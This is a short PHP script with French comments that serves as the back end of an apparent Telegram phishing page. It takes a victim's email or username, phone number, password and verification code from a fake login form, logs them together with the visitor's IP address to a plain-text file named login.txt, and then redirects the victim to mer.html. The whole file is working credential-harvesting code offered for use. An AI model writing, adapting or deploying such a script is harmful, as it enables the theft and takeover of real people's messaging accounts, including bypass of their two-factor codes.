<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère et nettoie les données du formulaire
    $username = htmlspecialchars(trim($_POST["email"] ?? ''));  // Adresse e-mail ou numéro de téléphone
    $password = htmlspecialchars(trim($_POST["password"] ?? '')); 
    $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));  // Indicatif pays
    $phone_number = htmlspecialchars(trim($_POST["phone_number"] ?? ''));  // Numéro de téléphone
    $verification_code = htmlspecialchars(trim($_POST["code"] ?? ''));  // Code de vérification
    $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';  // Case à cocher
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    // Vérifie si les champs ne sont pas vides (soit email/mot de passe, soit code de vérification)
    if ((!empty($username) && !empty($password)) || !empty($verification_code)) {
        // Formate les données pour l'enregistrement
        $data = "=== NOUVELLE CONNEXION TELEGRAM ===\n";
        $data .= "Date: $date\n";
        
        if (!empty($verification_code)) {
            $data .= "Code de vérification: $verification_code\n";
        } else {
            $data .= "Email/Username: $username\n";
            $data .= "Téléphone: $country_code$phone_number\n";
            $data .= "Mot de passe: $password\n";
            $data .= "Session active: $remember\n";
        }
        
        $data .= "Adresse IP: $ip\n";
        $data .= "==================================\n\n";
        
        // Configuration ultra-sophistiquée du fichier
        $file = "login.txt";
        
        // Crée le fichier s'il n'existe pas et set les permissions
        if (!file_exists($file)) {
            touch($file);
            chmod($file, 0644);  // -rw-r--r--
        }
        
        // Vérifie et corrige les permissions si nécessaire
        if (!is_writable($file)) {
            chmod($file, 0644);
        }
        
        // Double vérification de sécurité avant écriture
        clearstatcache(); // Nettoie le cache des statuts de fichier
        
        // Mécanisme d'écriture sécurisé avec verrou
        $attempts = 0;
        $max_attempts = 3;
        $written = false;
        
        while ($attempts < $max_attempts && !$written) {
            $written = file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
            if ($written === false) {
                usleep(100000); // 100ms de délai entre les tentatives
                $attempts++;
            }
        }
        
        if ($written !== false) {
            // Redirection vers mer.html après succès
            header("Location: mer.html");
            exit();
        } else {
            // Journalisation d'erreur professionnelle
            error_log("[" . date('Y-m-d H:i:s') . "] Échec d'écriture dans $file. IP: $ip");
            echo "Erreur système : Veuillez réessayer plus tard.";
            exit();
        }
    } else {
        echo "Erreur : Veuillez fournir soit un email/mot de passe, soit un code de vérification.";
        exit();
    }
} else {
    header("HTTP/1.1 403 Forbidden");
    echo "Accès refusé : Méthode non autorisée.";
    exit();
}
?>￼Enter
